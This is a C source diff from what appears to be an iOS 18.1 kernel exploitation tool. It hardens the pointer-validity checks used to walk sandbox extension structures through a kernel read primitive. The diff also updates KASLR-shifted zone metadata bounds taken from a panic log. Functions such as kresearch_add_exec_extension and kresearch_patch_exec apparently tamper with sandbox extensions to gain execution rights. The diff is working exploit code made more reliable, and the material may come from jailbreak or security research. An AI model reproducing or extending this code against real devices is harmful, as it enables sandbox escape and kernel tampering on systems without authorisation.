@@ -141,8 +141,10 @@ char *kresearch_read_breadcrumbs(void) {
 // Reading them through our kread primitive causes Translation fault → panic.
 // These globals hold the detected range; initial values from the last panic log.
 // kresearch_detect_zones() can update them at runtime.
-static uint64_t g_zone_meta_min = 0xffffffee69de4000ULL;
-static uint64_t g_zone_meta_max = 0xffffffee6b5e4000ULL;
+// Updated from panic log 2026-10-22: Metadata 0xffffffef48880000 - 0xffffffef4a080000
+// Previous defaults (0xffffffee...) were ~4GB off due to KASLR, beyond 16MB margin.
+static uint64_t g_zone_meta_min = 0xffffffef48880000ULL;
+static uint64_t g_zone_meta_max = 0xffffffef4a080000ULL;
 static bool     g_zone_meta_detected = false;
 
 // Zone MAP bounds — where actual zone allocations (heap objects) live.
@@ -203,17 +205,27 @@ static bool kptr_ok(uint64_t addr) {
     return true;
 }
 
-// Safest check for heap chain pointers: must be a valid struct pointer
-// AND within the calibrated zone map (actual mapped heap memory).
-// Use this when following linked-list next pointers (cn.next, ext_next)
-// which should ALWAYS be heap allocations. Falls back to kptr_ok()
-// if zone map hasn't been calibrated yet.
-static bool kptr_heap_ok(uint64_t addr) {
+// Safest check for heap chain pointers: must be a valid struct pointer,
+// within the calibrated zone map (actual mapped heap memory), AND
+// aligned to the zone element granularity so kreadbuf won't cross a
+// zone allocation boundary (iOS 18.1 panics on zone bound overflow).
+//
+// zone_align: minimum alignment for the struct being read (e.g. 0x20
+//   for extension_class_node, 0x20 for extension).  Must be a power of 2.
+//   Use 0 to skip the alignment check (falls back to 8-byte from kptr_ok).
+static bool kptr_heap_ok_aligned(uint64_t addr, uint64_t zone_align) {
     if (!kptr_ok(addr)) return false;
     if (g_zone_map_detected) {
         if (addr < g_zone_map_min || addr > g_zone_map_max) return false;
     }
+    if (zone_align > 8 && (addr & (zone_align - 1))) return false;
     return true;
+}
+
+// Default version with 0x20 (32-byte) zone alignment — good for
+// extension_class_node (0x20 bytes, allocated in data.kalloc.32).
+static bool kptr_heap_ok(uint64_t addr) {
+    return kptr_heap_ok_aligned(addr, 0x20);
 }
 
 static void hexdump_buf(uint64_t kaddr, size_t len, const char *label) {
@@ -280,12 +292,12 @@ static bool calibrate_zone_bounds(void) {
             uint64_t buckets[SANDBOX_EXT_NUM_BUCKETS];
             kreadbuf(ext_set, buckets, sizeof(buckets));
             for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
-                if (buckets[i] && kptr_ok(buckets[i])) {
+                if (buckets[i] && kptr_heap_ok(buckets[i])) {
                     RECORD(buckets[i]);
                     uint8_t cn_raw[0x20];
                     kreadbuf(buckets[i], cn_raw, 0x20);
                     uint64_t cn_ext = *(uint64_t *)(cn_raw + CN_OFF_EXT);
-                    if (cn_ext && kptr_ok(cn_ext)) {
+                    if (cn_ext && kptr_heap_ok_aligned(cn_ext, 0x20)) {
                         RECORD(cn_ext);
                         uint8_t eraw[EXT_RAW_SIZE];
                         kreadbuf(cn_ext, eraw, EXT_RAW_SIZE);
@@ -1810,7 +1822,7 @@ char *kresearch_add_exec_extension(void) {
     buf_append("\nCurrent extension buckets:\n");
     for (int i = 0; i < 9; i++) {
         uint64_t bucket = kread_ptr(self_info.extension_set + (i * 8));
-        if (bucket && kaddr_ok(bucket)) {
+        if (bucket && kptr_heap_ok(bucket)) {
             struct extension_class_node node = {0};
             kreadbuf(bucket, &node, sizeof(node));
             char name[128] = {0};
@@ -1823,7 +1835,7 @@ char *kresearch_add_exec_extension(void) {
             // Walk extension list
             uint64_t ext = (uint64_t)node.ext_list_head;
             int j = 0;
-            while (ext && kptr_ok(ext) && j < 5) {
+            while (ext && kptr_heap_ok_aligned(ext, 0x20) && j < 5) {
                 uint8_t eraw[EXT_RAW_SIZE];
                 memset(eraw, 0, sizeof(eraw));
                 kreadbuf(ext, eraw, sizeof(eraw));
@@ -1836,8 +1848,9 @@ char *kresearch_add_exec_extension(void) {
                 buf_append("    ext: path=\"%s\" pathlen=%llu\n",
                            path, (unsigned long long)data_len);
                 uint64_t next = *(uint64_t *)(eraw + 0x00);
-                if (next && !kptr_ok(next)) {
-                    buf_append("    ⚠️ STOPPED: ext next 0x%llx unsafe\n", next);
+                if (next && !kptr_heap_ok_aligned(next, 0x20)) {
+                    buf_append("    ⚠️ STOPPED: ext next 0x%llx unsafe (align=0x%llx)\n",
+                               next, next & 0x1F);
                     break;
                 }
                 ext = next;
@@ -2913,9 +2926,10 @@ char *kresearch_patch_exec(void) {
             buf_append("  bucket[%d]: NULL\n", i);
             continue;
         }
-        if (!kptr_ok(buckets[i])) {
-            buf_append("  bucket[%d]: 0x%llx SKIP (zone_meta=%s)\n",
-                       i, buckets[i], is_zone_meta(buckets[i]) ? "YES" : "no");
+        if (!kptr_heap_ok(buckets[i])) {
+            buf_append("  bucket[%d]: 0x%llx SKIP (zone_meta=%s align=%s)\n",
+                       i, buckets[i], is_zone_meta(buckets[i]) ? "YES" : "no",
+                       (buckets[i] & 0x1F) ? "BAD" : "ok");
             continue;
         }
 
@@ -2955,7 +2969,7 @@ char *kresearch_patch_exec(void) {
         // Walk extensions to find a writable data buffer for our string stash
         uint64_t ext = cn_ext;
         int ext_count = 0;
-        while (ext && kptr_ok(ext) && ext_count < 20) {
+        while (ext && kptr_heap_ok_aligned(ext, 0x20) && ext_count < 20) {
             uint8_t eraw[EXT_RAW_SIZE];
             kreadbuf(ext, eraw, EXT_RAW_SIZE);
 
@@ -2979,7 +2993,7 @@ char *kresearch_patch_exec(void) {
             }
 
             uint64_t next = *(uint64_t *)(eraw + 0x00);
-            if (next && !kptr_ok(next)) break;
+            if (next && !kptr_heap_ok_aligned(next, 0x20)) break;
             ext = next;
             ext_count++;
             total_exts++;
